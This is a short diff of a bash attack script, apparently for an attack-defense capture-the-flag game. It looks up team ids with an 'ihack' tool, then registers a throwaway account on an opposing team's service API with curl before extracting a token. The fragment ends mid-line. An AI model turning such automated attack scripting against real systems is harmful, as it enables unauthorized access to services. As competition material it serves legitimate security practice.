@@ -21,7 +21,7 @@ UUID='[0-9a-fA-F-]\{36\}'
 if [[ -z "$BRIEF" || -z "$NOTE" ]]; then
   TEAM="$(printf '%s' "$IP" | grep -oE '[0-9]+' | sed -n '3p')"   # 10.80.N.2 -> N
   echo "[*] fetching fresh ids for team $TEAM from ihack attack-info..."
-  for SLUG in "${IHACK_SERVICE:-c2}" c2 ihackc2 ihack-c2; do
+  for SLUG in "${IHACK_SERVICE:-ihackc2}" ihackc2 c2; do
     DUMP="$(ihack attack-info "$SLUG" "$TEAM" 2>/dev/null)"
     [[ -z "$DUMP" ]] && DUMP="$(ihack attack-info "$SLUG" 2>/dev/null | grep "$IP")"
     [[ -n "$DUMP" ]] && { echo "    (slug: $SLUG)"; break; }
@@ -41,7 +41,7 @@ echo "[*] target $B"
 echo "[*] register response:"
 REG="$(curl -s -c "$CJ" -X POST "$B/api/auth/register" \
   -H 'Content-Type: application/json' \
-  -d "{\"username\":\"zz$RANDOM$RANDOM\",\"password\":\"x\",\"callsign\":\"zz\"}")"
+  -d "{\"username\":\"zz$RANDOM$RANDOM\",\"password\":\"Passw0rd$RANDOM\",\"callsign\":\"zz\"}")"
 echo "    $REG"
 
 TOKEN="$(printf '%s' "$REG" | python3 -c 'import sys,json
